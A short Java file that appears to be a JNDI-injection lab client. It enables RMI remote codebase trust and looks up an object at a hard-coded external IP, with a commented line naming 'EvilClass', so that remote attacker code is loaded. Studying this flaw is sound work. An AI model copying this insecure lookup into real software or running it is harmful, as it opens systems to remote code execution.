package jndi;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class jndiclient {
    public static void main(String[] args) {
        try {
            System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
//            Object ret = new InitialContext().lookup("rmi://139.9.134.169:1099/EvilClass");
            Object ret = new InitialContext().lookup("rmi://139.9.134.169:1099/re8ciz");
            System.out.println("ret: " + ret);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}
